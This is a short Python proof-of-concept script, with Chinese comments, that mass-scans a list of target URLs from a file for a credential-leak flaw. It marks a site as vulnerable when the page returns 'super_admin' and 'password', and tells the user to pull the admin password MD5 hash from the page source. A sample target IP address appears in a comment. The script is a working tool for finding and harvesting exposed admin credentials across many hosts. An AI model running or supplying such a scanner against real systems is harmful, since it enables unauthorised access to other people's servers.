import base64
import sys
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def POC_1(target_url):
    vuln_url = target_url
    print(vuln_url)
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, timeout=5)
        #print(response.text)
        if "super_admin" in response.text and "password" in response.text and response.status_code == 200:
            print(" 目标 {}存在漏洞 ,F12查看源码获取密码md5值 \033[0m".format(target_url))
        else:
            print("目标 {}不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print(e.with_traceback())
        print(" 目标 {}不存在漏洞 \033[0m".format(target_url))
 
def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            url = url.strip('\n')
            #print(url)
            try:
                POC_1(url)

            except Exception as e:
                print("请求报错".format(e))
                continue

if __name__=='__main__':
    s='ip.txt'
    Scan(s)
    #注意需要http的网页才能成功，https需要证书，很麻烦
    # s ='http://222.188.83.98:9090'
    # POC_1(s)